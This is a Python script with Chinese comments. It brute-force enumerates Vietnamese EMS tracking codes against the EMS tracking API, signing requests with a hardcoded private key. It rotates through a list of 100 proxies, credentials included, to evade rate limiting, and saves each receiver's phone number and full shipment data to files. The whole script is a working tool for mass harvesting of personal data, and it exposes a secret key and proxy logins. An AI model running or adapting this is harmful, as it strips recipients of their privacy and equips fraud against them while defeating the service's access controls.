#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
10万订单扫描脚本 - 正确版本（使用EMS API）
"""

import hashlib
import requests
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"

# 100个代理池
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
    "185.101.253.194:5754:uadkcvtn:uo2rzar814ph",
    "38.153.133.31:9435:uadkcvtn:uo2rzar814ph",
    "108.165.161.42:5783:uadkcvtn:uo2rzar814ph",
    "2.57.31.80:6656:uadkcvtn:uo2rzar814ph",
    "45.56.173.242:6225:uadkcvtn:uo2rzar814ph",
    "216.173.104.22:6159:uadkcvtn:uo2rzar814ph",
    "216.173.123.97:6472:uadkcvtn:uo2rzar814ph",
    "104.253.55.119:5549:uadkcvtn:uo2rzar814ph",
    "91.211.87.2:6992:uadkcvtn:uo2rzar814ph",
    "142.111.44.203:5915:uadkcvtn:uo2rzar814ph",
    "191.101.174.88:6136:uadkcvtn:uo2rzar814ph",
    "31.58.26.144:6727:uadkcvtn:uo2rzar814ph",
    "104.232.211.81:5694:uadkcvtn:uo2rzar814ph",
    "104.253.48.76:5500:uadkcvtn:uo2rzar814ph",
    "154.36.85.89:6600:uadkcvtn:uo2rzar814ph",
    "140.99.202.10:5888:uadkcvtn:uo2rzar814ph",
    "45.41.169.227:6888:uadkcvtn:uo2rzar814ph",
    "45.67.0.158:6594:uadkcvtn:uo2rzar814ph",
    "45.150.176.51:5924:uadkcvtn:uo2rzar814ph",
    "104.238.7.43:5970:uadkcvtn:uo2rzar814ph",
    "216.173.75.47:6348:uadkcvtn:uo2rzar814ph",
    "45.39.5.58:6496:uadkcvtn:uo2rzar814ph",
    "46.203.157.176:7119:uadkcvtn:uo2rzar814ph",
    "104.233.20.17:6033:uadkcvtn:uo2rzar814ph",
    "216.74.114.235:6518:uadkcvtn:uo2rzar814ph",
    "142.202.254.167:6145:uadkcvtn:uo2rzar814ph",
    "37.44.219.236:6201:uadkcvtn:uo2rzar814ph",
    "82.24.239.176:7033:uadkcvtn:uo2rzar814ph",
    "104.239.19.194:6871:uadkcvtn:uo2rzar814ph",
    "191.101.181.187:6940:uadkcvtn:uo2rzar814ph",
    "38.154.199.233:5387:uadkcvtn:uo2rzar814ph",
    "45.39.18.128:6564:uadkcvtn:uo2rzar814ph",
    "103.47.53.151:8449:uadkcvtn:uo2rzar814ph",
    "45.39.17.119:5542:uadkcvtn:uo2rzar814ph",
    "216.173.75.226:6527:uadkcvtn:uo2rzar814ph",
    "45.56.175.4:5678:uadkcvtn:uo2rzar814ph",
    "64.137.89.84:6157:uadkcvtn:uo2rzar814ph",
    "82.21.248.115:6451:uadkcvtn:uo2rzar814ph",
    "198.46.241.44:6579:uadkcvtn:uo2rzar814ph",
    "45.83.57.20:6537:uadkcvtn:uo2rzar814ph",
    "104.239.41.168:6523:uadkcvtn:uo2rzar814ph",
    "64.137.77.92:5527:uadkcvtn:uo2rzar814ph",
    "104.253.82.58:6479:uadkcvtn:uo2rzar814ph",
    "82.23.223.166:8010:uadkcvtn:uo2rzar814ph",
    "185.15.178.90:5774:uadkcvtn:uo2rzar814ph",
    "209.127.191.113:5187:uadkcvtn:uo2rzar814ph",
    "191.101.174.78:6126:uadkcvtn:uo2rzar814ph",
    "217.69.127.152:6773:uadkcvtn:uo2rzar814ph",
    "38.225.2.55:5838:uadkcvtn:uo2rzar814ph",
    "92.112.136.179:6123:uadkcvtn:uo2rzar814ph",
]

CONFIG = {
    'target': 10,
    'total_threads': 5,
    'delay': 0.2,
    'max_98_retries': 10,
    'proxy_fail_threshold': 3,
}

DENSE_REGIONS = [
    {'prefix': 'EB', 'start': 102885483, 'end': 102885894, 'priority': 1, 'step': 1, 'name': 'EB_超密1'},
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_超密'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43572000, 'priority': 1, 'step': 1, 'name': 'EF_超密'},
]

state = {
    'found': 0,
    'tested': 0,
    'start_time': time.time(),
    'orders': [],
    'lock': Lock(),
}

class ProxyPool:
    def __init__(self, proxies):
        self.proxies = []
        self.failed_count = {}
        self.current_index = 0
        self.lock = Lock()
        
        for proxy_str in proxies:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                self.proxies.append({
                    'ip': ip,
                    'enabled': True,
                    'proxy_str': f'http://{user}:{password}@{ip}:{port}'
                })
                self.failed_count[f"{ip}:{port}"] = 0
    
    def get_next_proxy(self):
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                if proxy['enabled']:
                    return {'http': proxy['proxy_str'], 'https': proxy['proxy_str']}, proxy['ip']
                attempts += 1
            return None, None
    
    def mark_failure(self, proxy_ip):
        with self.lock:
            for proxy in self.proxies:
                if proxy['ip'] == proxy_ip:
                    self.failed_count[proxy['ip']] = self.failed_count.get(proxy['ip'], 0) + 1
                    if self.failed_count[proxy['ip']] >= CONFIG['proxy_fail_threshold']:
                        proxy['enabled'] = False
                        print(f"\n⚠️ 代理 {proxy_ip} 已禁用")
                    break

proxy_pool = ProxyPool(PROXIES)

def generate_signature(code):
    data = code.upper() + PRIVATE_KEY
    return hashlib.sha256(data.encode('utf-8')).hexdigest().upper()

def query_order(code, proxy_dict, proxy_ip):
    url = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"
    signature = generate_signature(code)
    payload = {'LadingCode': code.upper(), 'Signature': signature}
    
    for attempt in range(CONFIG['max_98_retries']):
        try:
            response = requests.post(url, json=payload, proxies=proxy_dict, timeout=15)
            result = response.json()
            api_code = result.get('Code', 'N/A')
            
            if api_code == '98':
                print(f"98..", end='', flush=True)
                proxy_pool.mark_failure(proxy_ip)
                time.sleep(0.3)
                proxy_dict, proxy_ip = proxy_pool.get_next_proxy()
                if not proxy_dict:
                    return None, "NO_PROXY"
                continue
            
            if api_code == '00':
                return result.get('Data'), "SUCCESS"
            else:
                return None, f"Code:{api_code}"
                
        except Exception as e:
            return None, f"ERROR"
    
    return None, "MAX_98_RETRY"

def scan_region(region):
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    name = region['name']
    
    print(f"\n🔍 扫描 [{name}] {prefix}{start:09d}-{prefix}{end:09d}")
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        code = f"{prefix}{num:09d}VN"
        proxy_dict, proxy_ip = proxy_pool.get_next_proxy()
        if not proxy_dict:
            print(f"\n❌ 无可用代理！")
            break
        
        data, status = query_order(code, proxy_dict, proxy_ip)
        
        with state['lock']:
            state['tested'] += 1
        
        if status == "SUCCESS" and data:
            phone = "N/A"
            if isinstance(data, dict) and 'ReceiverPhone' in data:
                phone = data['ReceiverPhone']
            
            with state['lock']:
                state['found'] += 1
                state['orders'].append({'code': code, 'phone': phone, 'data': data})
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                print(f"\n✅ [{state['found']}/{CONFIG['target']}] {code} | 📞 {phone} | ⚡ {speed:.1f}/s | 成功率:{rate:.2f}%")
        
        time.sleep(CONFIG['delay'])

def save_progress():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    txt_file = f"orders_{timestamp}.txt"
    json_file = f"orders_{timestamp}.json"
    
    with open(txt_file, 'w', encoding='utf-8') as f:
        for order in state['orders']:
            f.write(f"{order['code']}\t{order['phone']}\n")
    
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({'total': state['found'], 'orders': state['orders']}, f, ensure_ascii=False, indent=2)
    
    print(f"\n💾 已保存 {state['found']} 个订单")

def main():
    print("="*80)
    print("🚀 EMS订单扫描系统")
    print("="*80)
    print(f"📊 代理池: {len(PROXIES)} | 线程: {CONFIG['total_threads']} | 目标: {CONFIG['target']}")
    print("="*80)
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = [executor.submit(scan_region, r) for r in DENSE_REGIONS if state['found'] < CONFIG['target']]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"\n❌ 异常: {e}")
    
    save_progress()
    
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 扫描完成！")
    print("="*80)
    print(f"✅ 找到订单: {state['found']}")
    print(f"🔍 已测试: {state['tested']}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed:.1f} 秒")
    print("="*80)

if __name__ == "__main__":
    main()
